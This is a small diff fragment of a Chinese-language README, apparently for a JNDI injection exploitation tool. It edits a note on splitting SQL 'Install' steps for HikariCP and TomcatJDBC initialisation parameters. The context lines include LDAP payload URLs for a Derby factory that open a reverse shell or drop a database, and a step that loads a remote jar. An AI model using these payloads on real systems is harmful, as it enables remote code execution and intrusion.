@@ -262,7 +262,7 @@ ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0
 ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
 ```
 
-注意 HikariCP 的 connectionInitSql 参数不支持一次性执行多条 SQL 语句, 因此上述 **Install** 过程需要分开写
+注意 HikariCP/TomcatJDBC 的 connectionInitSql/initSQL 参数不支持一次性执行多条 SQL 语句, 因此上述 **Install** 过程需要分开写, 以 HikariCP 为例
 
 ```bash
 # 1. 加载远程 jar (会自动创建数据库)
